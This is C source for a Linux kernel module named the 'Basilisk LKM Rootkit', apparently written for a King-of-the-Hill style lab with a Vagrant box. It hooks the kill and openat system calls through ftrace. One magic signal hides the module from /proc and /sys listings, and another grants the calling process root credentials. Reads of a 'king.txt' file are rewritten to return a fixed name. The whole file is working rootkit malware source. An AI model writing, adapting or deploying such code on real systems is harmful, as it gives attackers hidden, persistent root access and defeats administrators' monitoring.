#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/file.h>
#include <linux/path.h>
#include <linux/err.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/path.h>
#include <linux/namei.h>


#include "include/ftrace_helper.h"
#include "include/stealth_helper.h"


// Macros for protecting king.txt
#define KING_FILENAME "/home/vagrant/king.txt"
#define KING_FILENAME_LEN strlen(KING_FILENAME)

#define KING "SKELLY\n"
#define KING_LEN strlen(KING)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Skelly");
MODULE_DESCRIPTION("Basilisk LKM Rootkit");
MODULE_VERSION("0.02");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

static short hidden = 0;

static ssize_t hook_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
{
    int read_len; 
    if (*pos == 0 && count >= KING_LEN) { // Simulate a read call and return our king name
        read_len = KING_LEN;
	if (copy_to_user(buf, KING, read_len)) {
	    pr_alert("basilisk: copy_to_user failed\n");
	    return -EFAULT;
        }
	*pos += read_len; 
        return read_len;
    } else {
	return 0; // Return EOF, read_len = 0; 
    }
}

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_openat)(const struct pt_regs *);

static asmlinkage long hook_openat(const struct pt_regs *regs)
{

    const char __user *filename = (char *)regs->si;
    int flags = regs->dx;
    umode_t mode = regs->r10;

    struct file *file;
    struct file_operations *new_f_ops;
    struct path path;

    char *resolved_path;
    long error;

    char kfilename[PATH_MAX];
    char *full_path;
    int fd;

    error = strncpy_from_user(kfilename, filename, PATH_MAX);
    if (error < 0) {
        pr_err("basilisk: failed to copy string from user space: error code %ld\n", error);
        return orig_openat(dfd, filename, flags, mode); // Return real sys_openat without delay 
    }

    resolved_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!resolved_path) {
        pr_err("basilisk: kmalloc failed");
	return orig_openat(dfd, filename, flags, mode); // Return real sys_openat without delay 
    }
    error = kern_path(kfilename, LOOKUP_FOLLOW, &path);
    if (error) {
	pr_err("basilisk: failed to resolve path: error code %ld\n", error);
        kfree(resolved_path);
        return orig_openat(dfd, filename, flags, mode);
    }
    full_path = d_path(&path, resolved_path, PATH_MAX);
    if (IS_ERR(full_path)) {
        pr_err("basilisk: d_path failed: %ld\n", PTR_ERR(full_path));
	path_put(&path);
        kfree(resolved_path);
        return PTR_ERR(full_path);
    }

    if (strncmp(full_path, KING_FILENAME, KING_FILENAME_LEN) == 0) {
        pr_alert("basilisk: opening king file: %s\n", full_path);
        // Get file descriptor 
        fd = orig_openat(dfd, filename, flags, mode);
        if (fd < 0) {
            pr_alert("basilisk: failed to open file: %s\n", kfilename);
            path_put(&path);
            kfree(resolved_path);
            return fd; 
        }
        if (fd == 0 || fd == 1 || fd == 2) { // make sure we are not messing with STDIN, STDOUT, STDERR
            path_put(&path);
            kfree(resolved_path);
            return orig_openat(dfd, filename, flags, mode);
        }
        // Get associated file struct (fget)
        file = fget(fd);
        if (!file) {
            pr_err("basilisk: failed to get file structure from file descriptor\n");
            path_put(&path);
            kfree(resolved_path);
            return orig_openat(dfd, filename, flags, mode); 
        }


        new_f_ops = kmemdup(file->f_op, sizeof(*file->f_op), GFP_KERNEL);
        if (!new_f_ops) {
            fput(file);
	    path_put(&path);
	    kfree(resolved_path);
            pr_alert("Failed to allocate memory for new file_operations\n");
            return orig_openat(dfd, filename, flags, mode);
        }
        new_f_ops->read = hook_read;
        file->f_op = new_f_ops;
        
        fput(file);
        path_put(&path);
        kfree(resolved_path);

        return fd;

    } else {
        path_put(&path);
        kfree(resolved_path);
        return orig_openat(dfd, filename, flags, mode);
    }
}
#else
static asmlinkage long (*orig_openat)(int dfd, const char __user *filename, int flags, umode_t mode);

static asmlinkage long hook_openat(int dfd, const char __user *filename, int flags, umode_t mode)
{
    struct file *file;
    struct file_operations *new_f_ops;
    struct path path;

    char *resolved_path;
    long error;

    char kfilename[PATH_MAX];
    error = strncpy_from_user(kfilename, filename, PATH_MAX);
    if (error < 0) {
        pr_err("basilisk: failed to copy string from user space: error code %ld\n", error);
        return orig_openat(dfd, filename, flags, mode); 
    }

    resolved_path = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!resolved_path) {

        return orig_openat(dfd, filename, flags, mode);  
    }
    error = kern_path(kfilename, LOOKUP_FOLLOW, &path);
    if (error) {
        kfree(resolved_path);
        return error;
    }
    char *full_path = d_path(&path, resolved_path, PATH_MAX);
    if (IS_ERR(full_path)) {
        path_put(&path);
        kfree(resolved_path);
        return PTR_ERR(full_path);
    }

    if (strncmp(full_path, KING_FILENAME, KING_FILENAME_LEN) == 0) {
        pr_alert("basilisk: opening king file: %s\n", full_path);
        // Get file descriptor 
        int fd = orig_openat(dfd, filename, flags, mode);
        if (fd < 0) {
            pr_alert("basilisk: failed to open file: %s\n", kfilename);
            path_put(&path);
            kfree(resolved_path);
            return fd; 
        }
        if (fd == 0 || fd == 1 || fd == 2) { // make sure we are not messing with STDIN, STDOUT, STDERR
            path_put(&path);
            kfree(resolved_path);
            return orig_openat(dfd, filename, flags, mode);
        }
        // Get associated file struct (fget)
        file = fget(fd);
        if (!file) {
            pr_err("basilisk: failed to get file structure from file descriptor\n");
            path_put(&path);
            kfree(resolved_path);
            return orig_openat(dfd, filename, flags, mode);
        }


        new_f_ops = kmemdup(file->f_op, sizeof(*file->f_op), GFP_KERNEL);
        if (!new_f_ops) {
            fput(file);
            pr_alert("Failed to allocate memory for new file_operations\n");
            return orig_openat(dfd, filename, flags, mode);
        }
        new_f_ops->read = hook_read;
        file->f_op = new_f_ops;
        
        fput(file);
        path_put(&path);
        kfree(resolved_path);

        return fd;

    } else {
        path_put(&path);
        kfree(resolved_path);
        return orig_openat(dfd, filename, flags, mode);
    }
}
#endif
/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
 * declare the orig_kill and hook_kill functions differently
 * depending on the kernel version. This is the largest barrier to 
 * getting the rootkit to work on earlier kernel versions. The
 * more modern way is to use the pt_regs struct. */

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

asmlinkage int hook_kill(const struct pt_regs *regs)
{ 
    void set_root(void);
    void show_basilisk(void);
    void hide_basilisk(void);
    
    int sig = regs->si;

    switch (sig) {
        case 63:
            if (hidden) 
            {
                printk(KERN_INFO "basilisk: showing kernel module...\n");
                show_basilisk();
            } else 
            {
                printk(KERN_INFO "basilisk: hiding kernel module...\n");
                hide_basilisk();
            };
            break;

        case 64:
            printk(KERN_INFO "basilisk: giving root...\n");
            set_root();
            break;
        
        default:
            return orig_kill(regs);
    }
    return 0;
}

#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

asmlinkage int hook_kill(pid_t pid, int sig)
{
    void set_root(void);
    void show_basilisk(void);
    void hide_basilisk(void);
    
    switch (sig) {
        case 63:
            if (hidden) 
            {
                printk(KERN_INFO "basilisk: showing kernel module...\n");
                show_basilisk();
            } else 
            {
                printk(KERN_INFO "basilisk: hiding kernel module...\n");
                hide_basilisk();
            };
            break;

        case 65:
            printk(KERN_INFO "basilisk: giving root...\n");
            set_root();
            break;
       
        default:
            return orig_kill(pid, sig);

    }
    return 0;
}
#endif

/* Add this LKM back to the loaded module list, at the point
 * specified by prev_module */

/* Record where we are in the loaded module list by storing
 * the module prior to us in prev_module, then remove ourselves
 * from the list */

void hide_basilisk(void)
{
    proc_hide();
    sys_hide();
    hidden = 1;
}
void show_basilisk(void)
{
    proc_show();
    sys_show();
    hidden = 0;
}

void set_root(void)
{
        struct cred *root;
        root = prepare_creds();

        if (root == NULL)
                return;

        // Set credentials to root
        root->uid.val = root->gid.val = 0;
        root->euid.val = root->egid.val = 0;
        root->suid.val = root->sgid.val = 0;
        root->fsuid.val = root->fsgid.val = 0;

        commit_creds(root);
}
/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
    HOOK("sys_openat", hook_openat, &orig_openat),
};

/* Module initialization function */
static int __init basilisk_init(void)
{
    int err;
    
    init_this_kobj(); // initialize this_kobj utility struct in stealth_helper.h
    /* Hook the syscall and print to the kernel buffer */
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    pr_info("basilisk: loaded\n");

    return 0;
}

static void __exit basilisk_exit(void)
{
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "basilisk: unloaded\n");
}

module_init(basilisk_init);
module_exit(basilisk_exit);
